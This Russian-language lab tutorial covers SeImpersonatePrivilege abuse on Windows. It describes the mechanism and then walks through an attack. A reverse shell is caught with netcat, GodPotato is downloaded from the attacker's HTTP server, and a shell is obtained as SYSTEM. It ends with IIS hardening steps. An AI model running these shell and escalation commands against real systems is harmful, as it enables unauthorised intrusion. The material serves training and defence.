#### SeImpersonatePrivilege

##### Теория:

**Суть механизма:** Если процесс имеет привилегию **SeImpersonatePrivilege** (часто встречается у **NT AUTHORITY\NETWORK SERVICE**, IIS, SQL Server и других сервисных учётных записей), атакующий может:

- создать вредоносный ресурс (named pipe, COM-объект) и вынудить системный процесс к нему подключиться - через триггер: запрос к принтеру, DCOM-активацию и т.д.
- перехватить токен этого процесса
- использовать его для выполнения кода с правами **SYSTEM**.

**Условия успешной эксплуатации:**

- У процесса есть **SeImpersonatePrivilege** (проверить: `whoami /priv`)
- ОС - Windows 8 / Server 2012 и выше

**Что это даёт:** Позволяет поднять права с низкоуровневого пользователя или службы до **SYSTEM** **легально** - используя штатный механизм Windows, без эксплуатации уязвимостей ядра или CVE. Именно поэтому атака сложно детектируется: Windows делает именно то, для чего предназначена привилегия.

**Важно:** Существует набор различных техник (RPC, DCOM, named pipes и т.д.), которые реализуют этот механизм. Их часто называют "**Potato**" (RottenPotato, JuicyPotato, GodPotato и др.), но это лишь реализации одного и того же принципа работы с **SeImpersonatePrivilege**. Эволюция этих инструментов связана с обходом ограничений конкретных версий ОС, а не с изменением сути самой привилегии.

#### Практика:

Скачайте файл[ **SeImpersonatePrivilege.ps1** ](https://storage.ptsecurity.com/seafhttp/f/51d738adae314308bff5/?op=view)на виртуальную машину - скрипт создаст сайт с веб консолью

Откройте Powershell от имени администратора

![](../../_images/1937c00c01d5.webp)

Перейдите в папку где лежит файл и запустите его. Команда: `.\SeImpersonatePrivilege.ps1`

![](../../_images/033ed853fe7d.webp)

Узнайте ip адрес вашей машины. Команда: `ipconfig`

![](../../_images/3eb022e0535d.webp)

На linux машине зайдите в браузер и введите адрес атакуемой машины. Вы увидите командную строку

![](../../_images/f07322cbfdae.webp)

Посмотрим от какой учетной записи командная строка. Введём команду: `whoami`

![](../../_images/37e65f079521.webp)

Впишем `whoami /priv` чтобы узнать текущие права пользователя

![](../../_images/07588779571f.webp)

> В списке мы видим наличие привилегии **SeImpersonatePrivilege**. Она позволяет процессу **выдавать себя за другого пользователя** в системе

Далее займёмся вредоносной нагрузкой. Для её создания нам необходимо узнать ip адрес атакующей машинки: `ip a`

![](../../_images/a4760250d3a7.jpg)

Заходим на сайт **https://www.revshells.com**. Вписываем свой **ip адрес**, port **443** и в OS Windows находим **PowerShell #3 (Base64)**

![](../../_images/f33a4a0d3185.webp)

> **Reverse shell generator** - это веб-инструмент, который позволяет быстро создавать вредоносную нагрузку для установления **обратного соединения** с атакующей машиной.

Скачайте **rlwrap** на линукс. Команда: `apt install rlwrap`

![](../../_images/348d8b4a2dd5.webp)

> **rlwrap** -  это утилита-обёртка, которая добавляет **поддержку readline** любой программе, которая её не имеет. Требуется для эксплуатации привилегий с использованием картошки

Запускаем и не выключаем: `rlwrap nc -lvnp 443`

- **nc** (netcat) - это утилита для чтения и записи данных через TCP/UDP соединения.
- **-lvnp 443** - listen, verbose, no DNS, port

![](../../_images/78dafdc133de.jpg)

На сайте атакуемой машины введем: `Powershell.exe -C "code from Reverse shell generator"`

![](../../_images/763a0ee6e2e7.webp)

В терминале увидим что мы подключились к атакуемой машине

![](../../_images/4cd7973a25db.webp)

Скачиваем на linux файл [**GodPotato-NET4.exe**](https://storage.ptsecurity.com/seafhttp/f/65ee31a86fbd4537a205/?op=view) и запускаем HTTP-сервер для передачи файлов в другом окне терминала. Команда: `python3 -m http.server 80`

> **Важно:** Файл должен лежать в директории в которой запускаете HTTP-Сервер

> **GodPotato-NET4.exe** лежит в архиве. Разархивировать данный архив можно исключительно на виртуальной машине, так как он содержит потенциально вредоносные файлы. Обратите внимание что на данном архиве стоит пароль - **edtechlab-intern**

![](../../_images/8da47f5923dc.jpg)

В терминале с подключением к атакуемой машине переходим в папку **tasks**: `cd C:\windows\tasks`

После скачиваем файл в директорию: `wget http://192.168.0.124/GodPotato-NET4.exe -O GodPotato-NET4.exe` - где:

- **wget** - псевдоним на **Invoke-WebRequest**. Оно скачивает содержимое веб-страницы или файла по указанному адресу
- **192.168.0.124** - адрес атакующей машины
- **GodPotato-NET4.exe** - имя файла на атакующей машине, которого хотим передать
- **-O** - параметр который указывает куда сохранить
- **GodPotato-NET4.exe** - Сохраняем с данным названием

![](../../_images/1e2b6d6eaa92.jpg)

В терминале HTTP-сервера мы увидим что передача произошла

![](../../_images/7f8db5cb1747.jpg)

На другом терминале включаем прослушивание 443 порта как ранее

![](../../_images/b00c9ca74f44.webp)

На атакуемой машине запускаем программу с командной строкой и передаем значения из Reverse shell generator. Команда: `.\GodPotato-NET4.exe -cmd "code from Reverse shell generator"`

![](../../_images/7b4f3eface95.webp)

Видим что теперь мы подключены от высокоуровневой учетной записи на атакуемой машине

![](../../_images/d6d4cea519a1.webp)

После завершения атаки выйдем из терминалов

##### Защита:

Для защиты от такого типа атак требуется ограничить привилегию **SeImpersonatePrivilege**, а также для сайтов создавать отдельных пользователей с ограничениями.

В windows и нажмите **Win + R** и введите **secpol.msc**

![](../../_images/5cbf33a21e1c.jpg)

В **Local Policies - User Rights Assignment** найдите **Impersonate a client after authentication**

![](../../_images/63788be55836.jpg)

Откройте ее и удалите **IIS_IUSRS**. Нажмите **Apply**

![](../../_images/f82cee4f9ecc.jpg)

Теперь в powershell:

- Cоздадим пользователя: `net user iis_site P@ssw0rd123456 /add`
   ![](../../_images/39b8d0f67ddf.webp)
- Уберем группы **users: **`net localgroup Users iis_site /delete`

![](../../_images/ce37909b26cb.jpg)

В **iis manager** заходим в **Application Pools** и находим **DefaultAppPool**(пул базового сайта). Правой кнопкой выбираем **Advanced Settings**

![](../../_images/7d20a4e09f7a.webp)

В **Process Model** находим **Identity** и нажимаем **...**

![](../../_images/bea8d2d4d641.webp)

В окне выбираем **Custom account** нажимаем **set...** и вписываем данные пользователя которого ранее создали

![](../../_images/7f7bfd23948b.webp)

Также зайдем в **Site** - **Default Web Site**

![](../../_images/1d6645ea822f.webp)

Перейдем в **Authentication** и отредактируем **Anonymous Authentication**

![](../../_images/43b3192dc89c.webp)

Настроим другого пользователя. Для этого нажмем **Set...**

![](../../_images/7d5a64033d3b.webp)

Вписываем данные пользователя которого ранее создали

![](../../_images/f18b4fc33332.webp)

Перезагружаем **iis**. Команда: `iisreset`

![](../../_images/1d7f33537797.webp)

Проверим через сайт что привилегия отключена. Команда: `whoami /priv`
